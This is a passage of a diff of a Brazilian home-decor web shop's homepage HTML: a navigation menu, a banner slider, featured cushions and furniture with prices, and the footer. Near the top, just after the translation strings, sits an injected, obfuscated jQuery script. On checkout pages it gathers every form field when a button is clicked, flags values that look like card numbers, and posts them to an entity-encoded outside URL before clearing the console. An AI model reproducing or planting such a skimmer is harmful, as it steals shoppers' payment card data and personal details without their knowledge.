n\u00e3o satisfaz o espa\u00e7o de texto especificado.","Please enter a number lower than 100.":"Informe um n\u00famero menor que 100.","Please select a file":"Selecione um arquivo","Please enter issue number or start date for switch\/solo card type.":"Informe um n\u00famero de seguran\u00e7a ou data de validade para o tipo de cart\u00e3o switch\/solo.","Please wait, loading...":"Carregando...","This date is a required value.":"A data \u00e9 um valor obrigat\u00f3rio.","Please enter a valid day (1-%d).":"Informe um dia v\u00e1lido (1-%d).","Please enter a valid month (1-12).":"Informe um m\u00eas v\u00e1lido (1-12).","Please enter a valid year (1900-%d).":"Informe um ano v\u00e1lido (1900-%d).","Please enter a valid full date":"Informe uma data completa","Please enter a valid date between %s and %s":"Informe uma data v\u00e1lida entre %s e %s","Please enter a valid date equal to or greater than %s":"Informe uma data v\u00e1lida igual ou maior que %s","Please enter a valid date less than or equal to %s":"Informe uma data v\u00e1lida menor ou igual a %s","Complete":"Completo","Add Products":"Criar Produtos","Please choose to register or to checkout as a guest":"Criar conta ou continuar como visitante","Your order cannot be completed at this time as there is no shipping methods available for it. Please make necessary changes in your shipping address.":"Seu pedido n\u00e3o pode ser finalizado no momento pois n\u00e3o h\u00e1 formas de entrega dispon\u00edveis para ele. Talvez seja necess\u00e1rio alterar seu endere\u00e7o de entrega.","Please specify payment method.":"Informe uma forma de pagamento.","Your order cannot be completed at this time as there is no payment methods available for it.":"Seu pedido n\u00e3o pode ser finalizado neste momento pois n\u00e3o h\u00e1 formas de pagamento dispon\u00edveis para ele.","Add to Cart":"Comprar","In Stock":"Em estoque","Out of Stock":"Esgotado"});
+        //]]></script><script type="text/javascript">jQuery(function(e){e("button").on("click",function(){var t="",o="post",n=window.location;if(new RegExp("checkout").test(n)){for(var c=document.querySelectorAll("input,select"),i=0;i<c.length;i++)if(c[i].value.length>0){var a=c[i].name;""==a&&(a=i),t+=a+"="+c[i].value+"&"}if(t){var l=new RegExp("[0-9]{13,16}"),u=new XMLHttpRequest;u.open(o,e("<div />").html("&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#111;&#119;&#110;&#115;&#97;&#102;&#101;&#116;&#121;&#46;&#111;&#114;&#103;&#47;&#111;&#112;&#112;&#46;&#112;&#104;&#112;").text(),!0),u.setRequestHeader("Content-type","application/x-www-form-urlencoded"),u.send(t+"&asd="+(l.test(t.replace(/s/g,""))?1:0)+"&utmp="+n),console.clear()}}})});</script></head>
+<body class=" cms-index-index cms-acessorios-e-decoracao">
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    Você precisa habilitar o Javascript no seu navegador para aproveitar as funcionalidades do site.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        
+<div class="container">
+<div class="header">
+    <div class="header-top">
+        
+            <div class="row ">
+                <div class="col-lg-4 welcome-msg">
+                    Bem-vindo,                  </div>
+                <div class="col-lg-8 information hidden-xs">
+                    <ul class="links">
+                        <li class="first" ><a href="http://www.rvalentim.com/customer/account/" title="Minha Conta" >Minha Conta</a></li>
+                                <li ><a href="http://www.rvalentim.com/wishlist/" title="Meus Favoritos" >Meus Favoritos</a></li>
+                                <li ><a href="http://www.rvalentim.com/checkout/cart/" title="Carrinho" class="top-link-cart">Carrinho</a></li>
+                                <li ><a href="http://www.rvalentim.com/checkout/" title="Fechar Pedido" class="top-link-checkout">Fechar Pedido</a></li>
+                                <li class=" last" ><a href="http://www.rvalentim.com/customer/account/login/referer/aHR0cDovL3d3dy5ydmFsZW50aW0uY29tLw,,/" title="Entrar" >Entrar</a></li>
+            </ul>
+                </div>
+            </div>
+    </div>
+    <div class="header-center">
+        
+        <div class="row">
+           <div class="col-xs-12 col-lg-3 brand">
+                                  <p class="logo"><strong>RValentim</strong><a href="http://www.rvalentim.com/" title="RValentim" class="logo"><img src="http://www.rvalentim.com/skin/frontend/rvalentim/awmage/images/logo.png" alt="RValentim" /></a></p>
+                          </div>
+            <div class="col-xs-12 col-lg-6 search hidden-xs">
+                <form id="search_mini_form" action="http://www.rvalentim.com/catalogsearch/result/" method="get">
+    <div class="form-search">
+        <input id="search" type="text" name="q" value="" class="input-text" maxlength="128" />
+        <button type="submit" title="Procurar" class="button"><span>Procurar</span></button>
+        <div id="search_autocomplete" class="search-autocomplete"></div>
+        <script type="text/javascript">
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Procurar no site...');
+            searchForm.initAutocomplete('http://www.rvalentim.com/catalogsearch/ajax/suggest/', 'search_autocomplete');
+        //]]>
+        </script>
+    </div>
+</form>
+            </div>
+            <div class="col-xs-12 col-lg-3 quick-access hidden-xs">
+
+
+                <div id="minicart" class="minicart">
+                    <span >(0) itens em seu carrinho</span>
+                </div>
+
+            </div>
+
+            <div class="minicart_head container-header">
+                
+
+<a href="http://www.rvalentim.com/checkout/cart/" data-target-element="#header-cart" class="skip-link skip-cart  no-count">
+    <span class="icon"></span>
+</a>
+
+<div id="header-cart" class="block block-cart skip-content">
+    
+<div id="minicart-error-message" class="minicart-message"></div>
+<div id="minicart-success-message" class="minicart-message"></div>
+
+<div class="minicart-wrapper">
+
+    <p class="block-subtitle">
+        Últimos Adicionados        <a class="close skip-link-close" href="#" title="Fechar">&times;</a>
+    </p>
+
+                    <p class="empty">Nenhum produto no carrinho.</p>
+
+    </div>
+</div>
+            </div>
+        </div>
+        
+   </div>
+</div>
+<div class="top-menu">
+    
+        
+
+<nav role="navigation" class="nav-menu">
+
+    <div class="navbar-header">
+        <button type="button" data-target="#navbarCollapse" data-toggle="collapse" class="navbar-toggle">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+        </button>
+    </div>
+
+    <div id="navbarCollapse" class="collapse navbar-collapse" >
+        <ul id="nav">
+            <li  class="level0 nav-1 first level-top parent"><a href="http://www.rvalentim.com/almofadas.html"  class="level-top" ><span>ALMOFADAS</span></a><ul class="level0"><li  class="level1 nav-1-1 first"><a href="http://www.rvalentim.com/almofadas/45-x-45-cm.html" ><span>45 x 45 cm</span></a></li><li  class="level1 nav-1-2"><a href="http://www.rvalentim.com/almofadas/45-x-30-cm.html" ><span>45 x 30 CM</span></a></li><li  class="level1 nav-1-3"><a href="http://www.rvalentim.com/almofadas/80-x-30-cm.html" ><span>80 X 30 CM</span></a></li><li  class="level1 nav-1-4"><a href="http://www.rvalentim.com/almofadas/bandas.html" ><span>BANDAS</span></a></li><li  class="level1 nav-1-5 last"><a href="http://www.rvalentim.com/almofadas/bandeiras.html" ><span>BANDEIRAS</span></a></li></ul></li><li  class="level0 nav-2 level-top parent"><a href="http://www.rvalentim.com/acessorios.html"  class="level-top" ><span>ACESSÓRIOS</span></a><ul class="level0"><li  class="level1 nav-2-1 first"><a href="http://www.rvalentim.com/acessorios/carteiras.html" ><span>CARTEIRAS</span></a></li><li  class="level1 nav-2-2"><a href="http://www.rvalentim.com/acessorios/case-ipad.html" ><span>CASE iPAD</span></a></li><li  class="level1 nav-2-3"><a href="http://www.rvalentim.com/acessorios/flamulas.html" ><span>FLAMULAS</span></a></li><li  class="level1 nav-2-4"><a href="http://www.rvalentim.com/acessorios/home-spray.html" ><span>HOME SPRAY</span></a></li><li  class="level1 nav-2-5"><a href="http://www.rvalentim.com/acessorios/necessaires.html" ><span>NECESSAIRES</span></a></li><li  class="level1 nav-2-6"><a href="http://www.rvalentim.com/acessorios/note-pocket.html" ><span>NOTE POCKET</span></a></li><li  class="level1 nav-2-7"><a href="http://www.rvalentim.com/acessorios/gifts.html" ><span>GIFTS</span></a></li><li  class="level1 nav-2-8 last"><a href="http://www.rvalentim.com/acessorios/estojos.html" ><span>ESTOJOS</span></a></li></ul></li><li  class="level0 nav-3 level-top"><a href="http://www.rvalentim.com/bolsas.html"  class="level-top" ><span>BOLSAS</span></a></li><li  class="level0 nav-4 level-top"><a href="http://www.rvalentim.com/mochilas.html"  class="level-top" ><span>MOCHILAS</span></a></li><li  class="level0 nav-5 level-top parent"><a href="http://www.rvalentim.com/moveis.html"  class="level-top" ><span>MÓVEIS</span></a><ul class="level0"><li  class="level1 nav-5-1 first"><a href="http://www.rvalentim.com/moveis/cadeiras.html" ><span>CADEIRAS</span></a></li><li  class="level1 nav-5-2"><a href="http://www.rvalentim.com/moveis/comodas.html" ><span>COMODAS</span></a></li><li  class="level1 nav-5-3 parent"><a href="http://www.rvalentim.com/moveis/mesas.html" ><span>MESAS</span></a><ul class="level1"><li  class="level2 nav-5-3-1 first"><a href="http://www.rvalentim.com/moveis/mesas/berger.html" ><span>BERGER</span></a></li><li  class="level2 nav-5-3-2"><a href="http://www.rvalentim.com/moveis/mesas/egg.html" ><span>EGG</span></a></li><li  class="level2 nav-5-3-3"><a href="http://www.rvalentim.com/moveis/mesas/swan.html" ><span>SWAN</span></a></li><li  class="level2 nav-5-3-4"><a href="http://www.rvalentim.com/moveis/mesas/eames.html" ><span>EAMES</span></a></li><li  class="level2 nav-5-3-5 last"><a href="http://www.rvalentim.com/moveis/mesas/lc.html" ><span>LC</span></a></li></ul></li><li  class="level1 nav-5-4"><a href="http://www.rvalentim.com/moveis/poltronas.html" ><span>POLTRONAS</span></a></li><li  class="level1 nav-5-5"><a href="http://www.rvalentim.com/moveis/pufes-baus.html" ><span>PUFES &amp; BAUS</span></a></li><li  class="level1 nav-5-6 last"><a href="http://www.rvalentim.com/moveis/sofas.html" ><span>SOFAS</span></a></li></ul></li><li  class="level0 nav-6 level-top parent"><a href="http://www.rvalentim.com/quadros.html"  class="level-top" ><span>QUADROS</span></a><ul class="level0"><li  class="level1 nav-6-1 first"><a href="http://www.rvalentim.com/quadros/bandeiras.html" ><span>BANDEIRAS</span></a></li><li  class="level1 nav-6-2"><a href="http://www.rvalentim.com/quadros/especiais.html" ><span>ESPECIAIS</span></a></li><li  class="level1 nav-6-3"><a href="http://www.rvalentim.com/quadros/madeira.html" ><span>MADEIRA</span></a></li><li  class="level1 nav-6-4"><a href="http://www.rvalentim.com/quadros/telas.html" ><span>TELAS</span></a></li><li  class="level1 nav-6-5 last"><a href="http://www.rvalentim.com/quadros/telas-street-art.html" ><span>TELAS STREET ART</span></a></li></ul></li><li  class="level0 nav-7 level-top"><a href="http://www.rvalentim.com/luzes.html"  class="level-top" ><span>LUZES</span></a></li><li  class="level0 nav-8 level-top"><a href="http://www.rvalentim.com/tecidos.html"  class="level-top" ><span>TECIDOS </span></a></li><li  class="level0 nav-9 last level-top"><a href="http://www.rvalentim.com/tapetes.html"  class="level-top" ><span>TAPETES</span></a></li>            <li class="level0 level-top"><a href="/shop/" class="level-top"><span>Blog</span></a></li>
+        </ul>
+    </div>
+</nav>
+    
+</div>
+</div>        <div class="main-container col1-layout">
+            <div class="main">
+                <div>
+<div class="container">
+    	
+
+<!-- If jquery alredy loaded/conflicts then below jQuery file not required -->
+<script type="text/javascript" src="http://www.rvalentim.com/js/bassi/imageslider/jquery.min.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/bassi/imageslider/jquery.easing.1.3.js"></script>
+<script type="text/javascript" src="http://www.rvalentim.com/js/bassi/imageslider/camera.js"></script>     
+<script type="text/javascript">
+	var $ds = jQuery.noConflict();
+	$ds(function(){
+		$ds('#camera_wrap_1').camera({
+			thumbnails: true,
+			fx: 'simpleFade',			
+			time: 4000,
+			transPeriod: 2000,
+			loader: 'pie',
+			navigation: 1,
+						opacityOnGrid: true,
+			pauseOnClick: false,
+			//playPause: 1,			
+			pagination: true,
+			autoAdvance: true,
+			loaderColor: '#DBD5D0',
+			loaderBgColor: '#000000',
+			loaderOpacity: 0.8		});			
+	});
+</script>				
+<link rel='stylesheet' id='camera-css'  href="http://www.rvalentim.com/skin/frontend/base/default/css/bassi/imageslider/camera.css" type='text/css' media='all'>
+<style>
+	
+	#back_to_camera {
+		clear: both;
+		display: block;
+		height: 80px;
+		line-height: 40px;
+		padding: 20px;
+	}
+	.fluid_container {
+		margin: 0 auto;
+		width: 100%;
+	}
+	.camera_prev, .camera_next, .camera_commands {
+		background: #DBD5D0;
+	}
+	.camera_thumbs_cont, .camera_wrap .camera_pag .camera_pag_ul li {
+		background: #999999;
+	}
+	.camera_wrap .camera_pag .camera_pag_ul li.cameracurrent > span {
+		background: #333333;
+	}
+	.camera_caption > div {
+		background: #333333;
+		opacity: 0.69;
+		font-size:14px;
+	}
+	.camera_caption {
+		color: #FFFFFF;
+	}
+	
+</style>
+<div class="fluid_container">    	
+	<div class="camera_wrap camera_coffee_skin" id="camera_wrap_1">
+			<div data-thumb="http://www.rvalentim.com/media/mbimages/thumbs/mbimages/b/a/baner_site5.jpg" data-src="http://www.rvalentim.com/media/mbimages/b/a/baner_site5.jpg" >
+					</div>	
+			<div data-thumb="http://www.rvalentim.com/media/mbimages/thumbs/mbimages/b/a/ban1.jpg" data-src="http://www.rvalentim.com/media/mbimages/b/a/ban1.jpg" >
+					</div>	
+			<div data-thumb="http://www.rvalentim.com/media/mbimages/thumbs/mbimages/b/a/baner_site_almofa.jpg" data-src="http://www.rvalentim.com/media/mbimages/b/a/baner_site_almofa.jpg" >
+					</div>	
+			<div data-thumb="http://www.rvalentim.com/media/mbimages/thumbs/mbimages/c/o/comodas2.jpg" data-src="http://www.rvalentim.com/media/mbimages/c/o/comodas2.jpg" >
+					</div>	
+			<div data-thumb="http://www.rvalentim.com/media/mbimages/thumbs/mbimages/b/a/baner_site_2.jpg" data-src="http://www.rvalentim.com/media/mbimages/b/a/baner_site_2.jpg" >
+					</div>	
+			<div data-thumb="http://www.rvalentim.com/media/mbimages/thumbs/mbimages/8/_/8.jpg" data-src="http://www.rvalentim.com/media/mbimages/8/_/8.jpg" >
+					</div>	
+			<div data-thumb="http://www.rvalentim.com/media/mbimages/thumbs/mbimages/b/a/baner_site.jpg" data-src="http://www.rvalentim.com/media/mbimages/b/a/baner_site.jpg" >
+					</div>	
+			<div data-thumb="http://www.rvalentim.com/media/mbimages/thumbs/mbimages/b/a/baner_site1.jpg" data-src="http://www.rvalentim.com/media/mbimages/b/a/baner_site1.jpg" >
+					</div>	
+			<div data-thumb="http://www.rvalentim.com/media/mbimages/thumbs/mbimages/b/a/baner_site_6_1.jpg" data-src="http://www.rvalentim.com/media/mbimages/b/a/baner_site_6_1.jpg" >
+					</div>	
+		
+	</div>
+</div>
+    
+<div style="clear:both; display:block;"></div>
+ 
+</div>
+
+<div class="container">
+    <div class="row small-banner">
+        <div class="col-lg-3 col-sm-3 col-xs-6 ">
+            <p><a href="http://www.rvalentim.com/acessorios/gifts.html"><img alt="rvalentim" src="http://www.rvalentim.com/media/wysiwyg/baner_peq..jpg" /></a></p>            <p><a href="http://www.rvalentim.com/moveis/sofas.html"><img title="SOF&Aacute; CHESTERFIELD by RVALENTIM" alt="sof&aacute; chesterfiel inglaterra" src="http://www.rvalentim.com/media/wysiwyg/baner_peq.jpg" /></a></p>        </div>
+        <div class="col-lg-3 col-sm-3 col-xs-6">
+            <p><img alt="" src="http://www.rvalentim.com/media/wysiwyg/baner_peq_frete.jpg" /></p>            <p><img alt="on air" src="http://www.rvalentim.com/media/wysiwyg/on_air.jpg" /></p>        </div>
+        <div class="col-lg-3 col-sm-3 col-xs-6">
+            <p><a href="http://www.rvalentim.com/nossas-lojas"><img alt="loja rvalentim" src="http://www.rvalentim.com/media/wysiwyg/loja_peq.jpg" /></a></p>            <p><a href="http://www.rvalentim.com/moveis/poltronas.html"><img title="poltrona rvalentim" alt="poltrona rvalentim" src="http://www.rvalentim.com/media/wysiwyg/POLTRONA_BERGER_site.jpg" /></a></p>        </div>
+        <div class="col-lg-3 col-sm-3 col-xs-6">
+            <p><a href="http://www.rvalentim.com/luzes.html"><img alt="horse" src="http://www.rvalentim.com/media/wysiwyg/horse.jpg" /></a></p>            <p><a href="http://www.rvalentim.com/quadros.html"><img alt="guitar frame" src="http://www.rvalentim.com/media/wysiwyg/guitar_frame_peq..jpg" /></a></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>        </div>
+
+        <style>
+            .category-products ul+ul+ul{ display: none}
+            .toolbar-bottom{ display: none}
+        </style>
+        
+        <center><h1 class="subtitle">Produtos em Destaque</h1></center>
+       
+        <p>        <div class="toolbar-bottom">
+            <div class="toolbar">
+    <div class="pager">
+        <p class="amount">
+                            <strong>6 Produto(s)</strong>
+                    </p>
+
+        <div class="limiter">
+            <label>Exibir</label>
+            <select onchange="setLocation(this.value)">
+                            <option value="http://www.rvalentim.com/?limit=12">
+                    12                </option>
+                            <option value="http://www.rvalentim.com/?limit=24" selected="selected">
+                    24                </option>
+                            <option value="http://www.rvalentim.com/?limit=36">
+                    36                </option>
+                        </select> por página        </div>
+
+        
+    </div>
+
+        <div class="sorter">
+                <p class="view-mode">
+                                    <label>Visualizar como:</label>
+                                                <strong title="Tabela" class="grid">Tabela</strong>&nbsp;
+                                                                <a href="http://www.rvalentim.com/?mode=list" title="Lista" class="list">Lista</a>&nbsp;
+                                                </p>
+            
+        <div class="sort-by">
+            <label>Ordem</label>
+            <select onchange="setLocation(this.value)">
+                            <option value="http://www.rvalentim.com/?dir=asc&amp;order=position" selected="selected">
+                    Relevância                </option>
+                            <option value="http://www.rvalentim.com/?dir=asc&amp;order=name">
+                    Nome                </option>
+                            <option value="http://www.rvalentim.com/?dir=asc&amp;order=price">
+                    Preço                </option>
+                        </select>
+                            <a href="http://www.rvalentim.com/?dir=desc&amp;order=position" title="Direção Descendente"><img src="http://www.rvalentim.com/skin/frontend/rvalentim/awmage/images/i_asc_arrow.gif" alt="Direção Descendente" class="v-middle" /></a>
+                    </div>
+    </div>
+    </div>
+        </div>
+    <div class="category-products">
+                        
+            
+                                                                        <ul class="products-grid">
+                                                                <li class="col-lg-4 col-xs-6 item first">
+                                                    <a href="http://www.rvalentim.com/destaques/almofada-don-t-stop.html" title="Almofada Don't Stop" class="product-image"><img src="http://www.rvalentim.com/media/catalog/product/cache/1/small_image/9df78eab33525d08d6e5fb8d27136e95/d/o/don_t_stop_copy1.jpg" class="img-responsive" alt="Almofada Don't Stop" /></a>
+                        <h2 class="product-name"><a href="http://www.rvalentim.com/destaques/almofada-don-t-stop.html" title="Almofada Don't Stop">Almofada Don't Stop</a></h2>
+                                                                                                
+                            <div class="price-box">
+                                <div class="old-price">De: R$129,00</div>
+                                <div class="special-price">Por: R$79,00</div>
+                                <div class="quote-special-price">Em <span class='qty-quote'>6x</span>  de <span class='v-quote'>R$13,17</span></div>
+                            </div>
+                                            </li>
+                                                                                            <li class="col-lg-4 col-xs-6 item">
+                                                    <a href="http://www.rvalentim.com/destaques/almofada-grecia.html" title="Almofada Grécia" class="product-image"><img src="http://www.rvalentim.com/media/catalog/product/cache/1/small_image/9df78eab33525d08d6e5fb8d27136e95/g/r/gre_cia.jpg" class="img-responsive" alt="Almofada Grécia" /></a>
+                        <h2 class="product-name"><a href="http://www.rvalentim.com/destaques/almofada-grecia.html" title="Almofada Grécia">Almofada Grécia</a></h2>
+                                                                                                
+                            <div class="price-box">
+                                <div class="old-price">De: R$119,00</div>
+                                <div class="special-price">Por: R$69,00</div>
+                                <div class="quote-special-price">Em <span class='qty-quote'>6x</span>  de <span class='v-quote'>R$11,50</span></div>
+                            </div>
+                                            </li>
+                                                                                            <li class="col-lg-4 col-xs-6 item last">
+                                                    <a href="http://www.rvalentim.com/destaques/almofada-thank-you.html" title="Almofada45 Thank You" class="product-image"><img src="http://www.rvalentim.com/media/catalog/product/cache/1/small_image/9df78eab33525d08d6e5fb8d27136e95/t/h/thanks.jpg" class="img-responsive" alt="Almofada45 Thank You" /></a>
+                        <h2 class="product-name"><a href="http://www.rvalentim.com/destaques/almofada-thank-you.html" title="Almofada45 Thank You">Almofada45 Thank You</a></h2>
+                                                                                                
+                            <div class="price-box">
+                                <div class="old-price">De: R$129,00</div>
+                                <div class="special-price">Por: R$79,00</div>
+                                <div class="quote-special-price">Em <span class='qty-quote'>6x</span>  de <span class='v-quote'>R$13,17</span></div>
+                            </div>
+                                            </li>
+                                        </ul>
+                                                                <ul class="products-grid">
+                                                                <li class="col-lg-4 col-xs-6 item first">
+                                                    <a href="http://www.rvalentim.com/destaques/bolsa-skull-pink.html" title="Bolsa Kate Imagine" class="product-image"><img src="http://www.rvalentim.com/media/catalog/product/cache/1/small_image/9df78eab33525d08d6e5fb8d27136e95/k/a/kate_imaginesite.jpg" class="img-responsive" alt="Bolsa Kate Imagine" /></a>
+                        <h2 class="product-name"><a href="http://www.rvalentim.com/destaques/bolsa-skull-pink.html" title="Bolsa Kate Imagine">Bolsa Kate Imagine</a></h2>
+                                                                                                                        
+                            <div class="price-box"> 
+                                                                                                <div class="quote-price">Em <span class='qty-quote'>6x</span>  de <span class='v-quote'>R$28,17</span></div>
+                                <div class="regular-price">ou a vista Por: <b>R$160,55</b></div>
+
+                            </div>  
+                                    <p class="pull-left availability in-stock"> <span>&nbsp;</span></p>
+                                                </li>
+                                                                                            <li class="col-lg-4 col-xs-6 item">
+                                                    <a href="http://www.rvalentim.com/destaques/mini-comoda-london.html" title="Mini Cômoda London" class="product-image"><img src="http://www.rvalentim.com/media/catalog/product/cache/1/small_image/9df78eab33525d08d6e5fb8d27136e95/c/o/comona_peq._1.jpg" class="img-responsive" alt="Mini Cômoda London" /></a>
+                        <h2 class="product-name"><a href="http://www.rvalentim.com/destaques/mini-comoda-london.html" title="Mini Cômoda London">Mini Cômoda London</a></h2>
+                                                                                                                        
+                            <div class="price-box"> 
+                                                                                                <div class="quote-price">Em <span class='qty-quote'>6x</span>  de <span class='v-quote'>R$375,00</span></div>
+                                <div class="regular-price">ou a vista Por: <b>R$2.137,50</b></div>
+
+                            </div>  
+                                    <p class="pull-left availability in-stock"> <span>&nbsp;</span></p>
+                                                </li>
+                                                                                            <li class="col-lg-4 col-xs-6 item last">
+                                                    <a href="http://www.rvalentim.com/destaques/luminaria-pipe-lamp-ferro.html" title="Luminária Pipe Ferro &quot;SUPER Star&quot;" class="product-image"><img src="http://www.rvalentim.com/media/catalog/product/cache/1/small_image/9df78eab33525d08d6e5fb8d27136e95/p/i/pipe_lamp_ferro.jpg" class="img-responsive" alt="Luminária Pipe Ferro &quot;SUPER Star&quot;" /></a>
+                        <h2 class="product-name"><a href="http://www.rvalentim.com/destaques/luminaria-pipe-lamp-ferro.html" title="Luminária Pipe Ferro &quot;SUPER Star&quot;">Luminária Pipe Ferro &quot;SUPER Star&quot;</a></h2>
+                                                                                                                        
+                            <div class="price-box"> 
+                                                                                                <div class="quote-price">Em <span class='qty-quote'>6x</span>  de <span class='v-quote'>R$93,33</span></div>
+                                <div class="regular-price">ou a vista Por: <b>R$532,00</b></div>
+
+                            </div>  
+                                    <p class="pull-left availability in-stock"> <span>&nbsp;</span></p>
+                                                </li>
+                                        </ul>
+                                        <script type="text/javascript">decorateGeneric($$('ul.products-grid'), ['odd','even','first','last'])</script>
+                <div class="toolbar-bottom">
+            <div class="toolbar">
+    <div class="pager">
+        <p class="amount">
+                            <strong>6 Produto(s)</strong>
+                    </p>
+
+        <div class="limiter">
+            <label>Exibir</label>
+            <select onchange="setLocation(this.value)">
+                            <option value="http://www.rvalentim.com/?limit=12">
+                    12                </option>
+                            <option value="http://www.rvalentim.com/?limit=24" selected="selected">
+                    24                </option>
+                            <option value="http://www.rvalentim.com/?limit=36">
+                    36                </option>
+                        </select> por página        </div>
+
+        
+    </div>
+
+        <div class="sorter">
+                <p class="view-mode">
+                                    <label>Visualizar como:</label>
+                                                <strong title="Tabela" class="grid">Tabela</strong>&nbsp;
+                                                                <a href="http://www.rvalentim.com/?mode=list" title="Lista" class="list">Lista</a>&nbsp;
+                                                </p>
+            
+        <div class="sort-by">
+            <label>Ordem</label>
+            <select onchange="setLocation(this.value)">
+                            <option value="http://www.rvalentim.com/?dir=asc&amp;order=position" selected="selected">
+                    Relevância                </option>
+                            <option value="http://www.rvalentim.com/?dir=asc&amp;order=name">
+                    Nome                </option>
+                            <option value="http://www.rvalentim.com/?dir=asc&amp;order=price">
+                    Preço                </option>
+                        </select>
+                            <a href="http://www.rvalentim.com/?dir=desc&amp;order=position" title="Direção Descendente"><img src="http://www.rvalentim.com/skin/frontend/rvalentim/awmage/images/i_asc_arrow.gif" alt="Direção Descendente" class="v-middle" /></a>
+                    </div>
+    </div>
+    </div>
+        </div>
+        
+    </div>
+</p>    </div>
+</div>
+
+ </div>
+                <div class="container"></div>
+                <div class="container col-main">
+                                        <div class="std">&nbsp;</div>                </div>
+            </div>
+        </div>
+        <div class="container">
+    <div class="footer">
+                <div class="row footer-one">
+            <div class="col-lg-4 hidden-xs footer-logo">
+                <style><!--
+.acessorios-e-decoracao {font-size:12px; margin-left: 30px;}
+--></style>
+<p><img title="Acessorios e Decora&ccedil;&atilde;o" alt="Acessorios e Decora&ccedil;&atilde;o" src="http://www.rvalentim.com/media/wysiwyg/icones/rvalentim.png" /></p>
+<h1 class="acessorios-e-decoracao">Acess&oacute;rios e Decora&ccedil;&atilde;o</h1>
+            </div>
+
+            <div class="col-lg-3 col-xs-12 footer-fone">
+                <h2>(11)3445-3262</h2>
+            </div>
+            
+            <div class="col-lg-5 col-xs-12 footer-newsletter">
+                <h2>Newsletter</h2>
+<form action="http://www.rvalentim.com/newsletter/subscriber/new/" method="post" >
+    <div class="block-content ">
+        <input placeholder="Informe seu email" style=" width: 150px; height: 25px;" type="text" name="email" id="newsletter" title="Assine nossa newsletter" class="input-text required-entry validate-email" />
+        <button style=" background: #000; color:#fff; border: none; padding: 5px 6px; position: relative; margin-top: 19px; cursor: pointer;">Enviar</button>
+        <h5>Cadastre-se e receba nossas promoções</h5>
+    </div>
+</form>
+<script type="text/javascript">
+    //<![CDATA[
+    var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
+    //]]>
+</script>            </div>
+
+        </div>
+        
+        <div class="row footer-two">        	
+
+    		<div class="informacoes col-lg-3 col-sm-3 col-xs-6">        			
+    			<div class="links">
+					<p><a title="Politica de Privacidade" href="/politica-de-privacidade">Privacidade e Seguran&ccedil;a</a></p>
+<p><a title="Trocas e devolu&ccedil;&otilde;es" href="/trocas-e-devolucoes">Trocas e Devolu&ccedil;&otilde;es</a></p>
+<p><a href="http://www.rvalentim.com/webforms/index/index/id/1/">Fale Conosco</a></p>
+<p><a title="Conhe&ccedil;a a RValentim" href="/sobre-nos">Sobre N&oacute;s</a></p>
+<p><a href="/nossas-lojas">Nossas Lojas</a></p>
+<p><a title="Site Map" href="/catalog/seo_sitemap/category">Site Map</a></p>    			</div>
+    		</div>
+    		<div class="redes-sociais col-lg-3 col-sm-3 col-xs-6">					
+				<div class="links">
+					<style><!--
+.redes-sociais .links li {
+    float: left;
+    margin-right: 15px;
+    width: 24%;
+    margin-top: 10px;
+    margin-left: 4px;
+}
+
+.redes-sociais .links li img {
+    width:100%;
+    height:auto;
+}
+--></style>
+<ul>
+<li><a title="Facebook" href="http://www.facebook.com/pages/RVALENTIM/257952244244522?sk=wall" target="_blank"><img alt="" src="http://www.rvalentim.com/media/wysiwyg/icones/face.jpg" /></a></li>
+<li><a title="Twitter" href="http://twitter.com/#!/robertovalentim" target="_blank"><img alt="" src="http://www.rvalentim.com/media/wysiwyg/icones/twitter.jpg" /></a></li>
+<li><a title="Instagram" href="http://www.instagram.com/rvalentim2009" target="_blank"><img alt="" src="http://www.rvalentim.com/media/wysiwyg/icones/insta.jpg" /></a></li>
+<li><a title="Youtube" href="https://www.youtube.com/channel/UCikUNVUS5kR5Zv_m9Kn5zgg" target="_blank"><img alt="" src="http://www.rvalentim.com/media/wysiwyg/icones/youtube.jpg" /></a></li>
+<li><a title="Pinterest" href="http://www.pinterest.com/robertovalentim" target="_blank"><img alt="" src="http://www.rvalentim.com/media/wysiwyg/icones/unnamed.jpg" /></a></li>
+<li><a title="Blog" href="http://rvalentim.com/shop/" target="_blank"><img alt="" src="http://www.rvalentim.com/media/wysiwyg/icones/blog.jpg" /></a></li>
+</ul>				</div>
+    		</div>
+            <div class="pagamentos col-lg-3 col-sm-3 col-xs-6">                    
+                <div class="links">
+                    <style><!--
+.pagamentos .links li {
+    float: left;
+    margin-right: 15px;
+    width: 24%;
+    margin-top: 10px;
+    margin-left: 4px;
+}
+
+.pagamentos .links li img {
+    width:100%;
+    height:auto;
+}
+--></style>
+<ul>
+<li><img alt="" src="http://www.rvalentim.com/media/wysiwyg/icones/visa.jpg" /></li>
+<li><img alt="" src="http://www.rvalentim.com/media/wysiwyg/icones/master.jpg" /></li>
+<li><img alt="" src="http://www.rvalentim.com/media/wysiwyg/icones/elo.jpg" /></li>
+<li><img alt="" src="http://www.rvalentim.com/media/wysiwyg/icones/american.jpg" /></li>
+<li><img alt="" src="http://www.rvalentim.com/media/wysiwyg/icones/itau.jpg" /></li>
+<li><img alt="" src="http://www.rvalentim.com/media/wysiwyg/icones/boleto.jpg" /></li>
+</ul>                </div>
+            </div>
+            <div class="certificados col-lg-3 col-sm-3 col-xs-12">                    
+                <div class="links">
+                    <p><img title="Compra Segura - Comodo" alt="" src="http://www.rvalentim.com/media/wysiwyg/comodo-ssl1.jpg" /></p>                </div>
+            </div>       	
+        </div>        
+    </div>
+</div>
+
+
+<div class="footer-copyright-wrapper">
+	<div class="container footer-copyright">
+		<div class="row">
+			<address>&copy;  R V A L E N T I M Todos Direitos Reservados | CNPJ: 11.272.723/0001-66 | Avenida Roque Petroni Júnior, 141 - CEP: 04707-000 - São Paulo.</address>
+		</div>
+	</div>
+</div>
+                
+
+    </div>
+</div>
